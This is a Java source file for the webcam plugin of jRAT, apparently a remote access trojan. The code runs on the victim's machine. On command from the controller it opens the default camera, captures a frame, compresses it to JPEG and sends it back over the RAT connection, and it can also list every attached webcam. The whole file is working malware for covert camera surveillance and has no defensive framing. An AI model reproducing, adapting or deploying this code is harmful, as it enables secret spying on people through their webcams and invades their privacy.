package se.jrat.plugin.webcam.stub;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.Iterator;
import java.util.List;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;

import jrat.api.stub.StubPlugin;

import com.github.sarxos.webcam.Webcam;

public class WebcamPlugin extends StubPlugin {

	public static final byte HEADER = 120;
	public static final byte LIST_WEBCAM_HEADER = 121;

	public static DataInputStream dis;
	public static DataOutputStream dos;
	public static boolean enabled;
	public static Webcam cam;

	static {
		try {
			cam = Webcam.getDefault();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void onEnable() throws Exception {

	}

	public void onDisconnect(Exception ex) {
		if (cam != null && cam.isOpen()) {
			cam.close();
		}
	}

	public void onConnect(DataInputStream in, DataOutputStream out) {
		WebcamPlugin.dis = in;
		WebcamPlugin.dos = out;
	}

	public void onPacket(byte header) throws Exception {
		if (header == HEADER) {
			enabled = dis.readBoolean();

			if (enabled) {
				dos.writeByte(header);

				try {
					if (!cam.isOpen()) {
						cam.open();
					}

					String line = cam.getName();
					dos.writeShort(line.length());
					dos.writeChars(line);

					BufferedImage image = cam.getImage();

					ByteArrayOutputStream baos = new ByteArrayOutputStream();
					ImageOutputStream ios = ImageIO.createImageOutputStream(baos);
					Iterator<ImageWriter> iterators = ImageIO.getImageWritersByFormatName("jpeg");
					ImageWriter imgwriter = iterators.next();
					ImageWriteParam imgwriterp = imgwriter.getDefaultWriteParam();
					imgwriterp.setCompressionMode(2);
					imgwriterp.setCompressionQuality(0.75f);
					imgwriter.setOutput(ios);
					imgwriter.write(null, new IIOImage(image, null, null), imgwriterp);
					imgwriter.dispose();

					byte[] buffer = baos.toByteArray();

					System.out.println(image.getWidth() + " " + image.getHeight());

					dos.writeInt(buffer.length);
					dos.write(buffer);
				} catch (Exception ex) {
					ex.printStackTrace();
					String line = "DISABLED";
					dos.writeShort(line.length());
					dos.writeChars(line);
				}
			} else {
				if (cam != null) {
					cam.close();
				}
			}

		} else if (header == LIST_WEBCAM_HEADER) {
			try {
				List<Webcam> webcams = Webcam.getWebcams();
				
				dos.writeByte(LIST_WEBCAM_HEADER);

				dos.writeInt(webcams.size());
				System.out.println(webcams.size());
				
				for (Webcam webcam : webcams) {
					writeString(webcam.getName());
				}
			} catch (Exception ex) {
				ex.printStackTrace();
				dos.writeInt(0);
				System.out.println("FAILED");
			}
		}
	}

	public static synchronized String readString() throws Exception {
		short len = dis.readShort();

		StringBuffer buffer = new StringBuffer();

		for (short s = 0; s < len; s++) {
			buffer.append(dis.readChar());
		}

		String str = buffer.toString();

		if (str.startsWith("-c ")) {
			str = str.substring(3, str.length());
		}

		return str;
	}
	
	public static synchronized void writeString(String s) throws Exception {
		dos.writeShort(s.length());
		dos.writeChars(s);
	}

	@Override
	public String getName() {
		return "Webcam";
	}

	@Override
	public void onStart() {

	}
}
